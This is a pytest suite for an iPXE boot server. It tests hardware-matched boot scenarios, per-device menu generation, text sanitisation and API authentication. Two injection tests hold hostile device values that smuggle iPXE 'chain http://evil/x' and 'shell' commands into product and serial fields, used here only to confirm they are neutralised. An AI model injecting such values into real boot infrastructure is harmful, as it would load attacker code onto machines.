"""Scenarios for specific machines and the menu the server builds for each machine."""

import json

import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError

import app.routes.ipxe as routes_ipxe
import app.routes.state as state
from app.backend.config import settings
from app.backend.device_scenarios import (
    Scenario,
    build_device_menu,
    device_display_name,
    ipxe_safe_text,
    load_scenarios,
    save_scenarios,
    scenario_matches,
    scenarios_for_device,
    validate_scenarios,
)
from app.backend.ipxe_manager import iPXEEntry, iPXEGenerator, iPXEMenu
from app.main import app

client = TestClient(app)

DELL = {
    "manufacturer": "Dell Inc.",
    "product": "Latitude 5530",
    "sku": "0B06",
    "serial": "ABC1234",
    "bios_version": "1.36.0",
    "bios_date": "04/27/2026",
    "mac": "00:11:22:33:44:55",
    "nic_pci": "8086:1a1e",
    "platform": "efi",
    "arch": "x86_64",
}

MENU = {
    "title": "PXE Boot Menu",
    "timeout": 30000,
    "entries": [
        {
            "name": "krd",
            "title": "Kaspersky Rescue Disk",
            "entry_type": "boot",
            "kernel": "k/vmlinuz",
            "initrd": "k/initrd.img",
            "cmdline": "boot=live",
            "boot_mode": "rescue",
        },
        {"name": "tools", "title": "Tools", "entry_type": "submenu"},
        {"name": "sep", "title": "----", "entry_type": "separator"},
    ],
}


def _scenario(**overrides):
    data = {
        "id": "live-5530",
        "title": "Live system for Latitude 5530",
        "match": {"manufacturer": "Dell*", "product": "Latitude 5530"},
        "entry": "krd",
    }
    data.update(overrides)
    return Scenario(**data)


# ---------------------------------------------------------------------------
# Rules
# ---------------------------------------------------------------------------


def test_scenario_matches_by_wildcard_ignoring_case():
    assert scenario_matches(_scenario(), DELL)
    assert scenario_matches(_scenario(match={"product": "LATITUDE *"}), DELL)
    assert not scenario_matches(_scenario(match={"product": "Latitude 5440"}), DELL)
    # "*" accepts anything, including a field the machine did not report; "?*" needs a value
    assert scenario_matches(_scenario(match={"serial": "*"}), {"manufacturer": "Dell Inc."})
    assert not scenario_matches(_scenario(match={"serial": "?*"}), {"manufacturer": "Dell Inc."})


def test_scenario_needs_every_field_to_match():
    rule = _scenario(match={"manufacturer": "Dell*", "sku": "0C1E"})

    assert not scenario_matches(rule, DELL)


def test_invalid_scenarios_are_rejected():
    with pytest.raises(ValidationError):
        _scenario(match={"colour": "red"})  # not something a machine reports
    with pytest.raises(ValidationError):
        _scenario(id="has space")
    with pytest.raises(ValidationError):
        _scenario(mode="auto", match={})  # an automatic scenario must name its machines
    with pytest.raises(ValidationError):
        _scenario(mode="sometimes")


def test_only_enabled_scenarios_with_an_existing_entry_apply():
    scenarios = [
        _scenario(id="a"),
        _scenario(id="off", enabled=False),
        _scenario(id="gone", entry="removed"),
        _scenario(id="other", match={"manufacturer": "HP"}),
    ]

    picked = scenarios_for_device(scenarios, DELL, {"krd"})

    assert [s.id for s in picked] == ["a"]


def test_validate_reports_duplicates_and_missing_entries():
    errors = validate_scenarios(
        [_scenario(), _scenario(), _scenario(id="x", entry="nope")], {"krd"}
    )

    assert any("duplicate" in e for e in errors)
    assert any("nope" in e for e in errors)


def test_scenarios_survive_a_save_and_a_broken_item_does_not_hide_the_rest(tmp_path):
    path = tmp_path / "scenarios.json"
    save_scenarios(path, [_scenario()])
    data = json.loads(path.read_text())
    data["scenarios"].append({"id": "bad id", "title": "x", "entry": "krd"})
    path.write_text(json.dumps(data))

    assert [s.id for s in load_scenarios(path)] == ["live-5530"]
    assert load_scenarios(tmp_path / "missing.json") == []


# ---------------------------------------------------------------------------
# Text from the machine must not be able to change the script
# ---------------------------------------------------------------------------


def test_machine_supplied_text_cannot_carry_ipxe_syntax():
    hostile = "Dell || chain http://evil/x && exit ${net0/mac} \n echo pwned"

    safe = ipxe_safe_text(hostile, 200)

    for bad in ("|", "&", "$", "{", "}", "\n"):
        assert bad not in safe
    assert "Dell" in safe


def test_display_name_handles_hp_and_lenovo():
    assert device_display_name({"manufacturer": "HP", "product": "HP EliteBook 840 G9"}) == (
        "HP EliteBook 840 G9"
    )
    assert device_display_name({"manufacturer": "Dell Inc.", "product": "Latitude 5530"}) == (
        "Dell Inc. Latitude 5530"
    )
    assert device_display_name(
        {"manufacturer": "LENOVO", "product": "21AH00E3UK", "family": "ThinkPad T14 Gen 3"}
    ) == ("LENOVO ThinkPad T14 Gen 3")


def test_only_the_first_automatic_scenario_is_preselected():
    device_menu = build_device_menu(
        DELL,
        [
            _scenario(id="one", mode="auto"),
            _scenario(id="two", mode="auto"),
            _scenario(id="three"),
        ],
    )

    assert [r.auto for r in device_menu.recommendations] == [True, False, False]
    assert ("Serial number", "ABC1234") in device_menu.info
    assert ("BIOS", "1.36.0 (04/27/2026)") in device_menu.info


# ---------------------------------------------------------------------------
# The generated menu
# ---------------------------------------------------------------------------


def _menu():
    return iPXEMenu(
        title="T",
        server_ip="10.0.0.1",
        http_port=8080,
        entries=[iPXEEntry(name="krd", title="Kaspersky", kernel="k/vmlinuz", initrd="k/initrd")],
    )


def test_personal_menu_recommends_and_can_show_device_information():
    script = iPXEGenerator.generate_ipxe_script(
        _menu(), build_device_menu(DELL, [_scenario(title="Live system")])
    )

    assert "item --gap -- Recommended for Dell Inc. Latitude 5530" in script
    assert "item rec_live-5530 [FOR THIS DEVICE] Live system" in script
    assert "item device_info [INFO] Device information" in script
    assert ":rec_live-5530\necho Starting Live system...\ngoto krd" in script
    assert "echo Serial number: ABC1234" in script
    assert "echo IP address: ${net0/ip}" in script
    assert "\nchain " not in script  # the personal menu must not ask for itself again


def test_automatic_scenario_is_preselected_with_a_countdown():
    script = iPXEGenerator.generate_ipxe_script(
        _menu(), build_device_menu(DELL, [_scenario(mode="auto")])
    )

    assert "choose --default rec_live-5530 --timeout 15000 target" in script
    assert "(starts in 15 s)" in script


def test_an_offered_scenario_never_starts_by_itself():
    """Regression: with a 30 s menu timeout and no default iPXE picks the first item, which is
    now the recommended scenario, so an offer booted by itself when the countdown ended."""
    script = iPXEGenerator.generate_ipxe_script(_menu(), build_device_menu(DELL, [_scenario()]))

    choose = [line for line in script.splitlines() if line.startswith("choose ")]
    assert choose == ["choose target && goto ${target}"]  # no timeout, no default


def test_an_explicit_default_entry_still_counts_down_with_recommendations():
    menu = _menu()
    menu.default_entry = "krd"

    script = iPXEGenerator.generate_ipxe_script(menu, build_device_menu(DELL, [_scenario()]))

    assert "choose --default krd --timeout" in script


def test_menu_without_scenarios_still_offers_device_information():
    script = iPXEGenerator.generate_ipxe_script(_menu(), build_device_menu(DELL, []))

    assert "Recommended for" not in script
    assert "item device_info [INFO] Device information" in script


def test_hostile_device_values_do_not_reach_the_script_as_commands():
    hostile = dict(DELL, product="X || chain http://evil/x", serial="${net0/mac}\nshell")

    script = iPXEGenerator.generate_ipxe_script(_menu(), build_device_menu(hostile, []))

    lines = script.splitlines()
    assert not any(line.startswith("chain") for line in lines)  # only inert text in echo lines
    assert "||" not in script and "&&" not in script.replace("&& goto", "")
    assert "${net0/mac}" not in script.split(":device_info")[1].split(":shell")[0].replace(
        "${net0/ip}", ""
    )
    info_block = script.split(":device_info")[1].split(":shell")[0].splitlines()
    assert "shell" not in [line.strip() for line in info_block]  # the newline was not honoured


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------


@pytest.fixture
def menu_env(tmp_path, monkeypatch):
    monkeypatch.setattr(routes_ipxe, "IPXE_ROOT", tmp_path)
    monkeypatch.setattr(routes_ipxe, "SCENARIOS_FILE", tmp_path / "scenarios.json")
    monkeypatch.setattr(state, "INVENTORY_FILE", tmp_path / "clients.json")
    monkeypatch.setattr(state, "_inventory_loaded", False)
    state.CLIENT_INVENTORY.clear()
    state.SYSTEM_LOGS.clear()
    yield tmp_path
    state.CLIENT_INVENTORY.clear()


def _save_menu(tmp_path):
    (tmp_path / "menu.json").write_text(json.dumps(MENU))


def _save_scenarios(tmp_path, *scenarios):
    save_scenarios(tmp_path / "scenarios.json", list(scenarios))


def test_menu_is_404_until_one_is_saved(menu_env):
    assert client.get("/ipxe/menu", params=DELL).status_code == 404


def test_machine_gets_a_menu_built_for_it_and_is_recorded(menu_env):
    _save_menu(menu_env)
    _save_scenarios(menu_env, _scenario())

    resp = client.get("/ipxe/menu", params=DELL)

    assert resp.status_code == 200
    assert "Recommended for Dell Inc. Latitude 5530" in resp.text
    assert "goto krd" in resp.text
    assert [c["serial"] for c in state.list_client_inventory()] == ["ABC1234"]


def test_other_machines_do_not_get_the_recommendation(menu_env):
    _save_menu(menu_env)
    _save_scenarios(menu_env, _scenario())

    resp = client.get("/ipxe/menu", params={"manufacturer": "HP", "product": "EliteBook"})

    assert "Recommended for" not in resp.text
    assert "Device information" in resp.text


def test_preview_builds_the_menu_without_recording_the_machine(menu_env):
    _save_menu(menu_env)

    resp = client.get("/ipxe/menu", params=dict(DELL, preview="1"))

    assert resp.status_code == 200
    assert state.list_client_inventory() == []


def test_menu_is_open_in_token_mode_but_scenarios_api_is_not(menu_env, monkeypatch):
    _save_menu(menu_env)
    monkeypatch.setattr(settings, "security_mode", "token")
    monkeypatch.setattr(settings, "api_token", "secret-token")

    assert client.get("/ipxe/menu", params=DELL).status_code == 200
    assert client.get("/api/scenarios").status_code == 401
    assert (
        client.get("/api/scenarios", headers={"Authorization": "Bearer secret-token"}).status_code
        == 200
    )


def test_scenarios_api_lists_replaces_and_validates(menu_env):
    _save_menu(menu_env)

    listing = client.get("/api/scenarios").json()
    assert listing["scenarios"] == []
    assert {e["name"] for e in listing["entries"]} == {"krd", "tools"}  # no separators

    body = {"scenarios": [_scenario().model_dump()]}
    assert client.put("/api/scenarios", json=body).status_code == 200
    assert client.get("/api/scenarios").json()["scenarios"][0]["id"] == "live-5530"

    bad = {"scenarios": [_scenario(entry="removed").model_dump()]}
    resp = client.put("/api/scenarios", json=bad)
    assert resp.status_code == 422 and "removed" in json.dumps(resp.json())
    assert client.put("/api/scenarios", json={"scenarios": [{"id": "x"}]}).status_code == 422


def test_known_machines_show_which_scenarios_apply(menu_env):
    _save_menu(menu_env)
    _save_scenarios(menu_env, _scenario())
    state.record_client_inventory("10.0.0.9", DELL)

    (device,) = client.get("/api/monitoring/clients").json()["clients"]

    assert device["scenarios"] == [
        {"id": "live-5530", "title": "Live system for Latitude 5530", "mode": "offer"}
    ]
    preview = client.get(f"/api/scenarios/preview/{device['id']}").json()
    assert [s["id"] for s in preview["matched"]] == ["live-5530"]
    assert "item rec_live-5530" in preview["script"]
    assert client.get("/api/scenarios/preview/unknown").status_code == 404
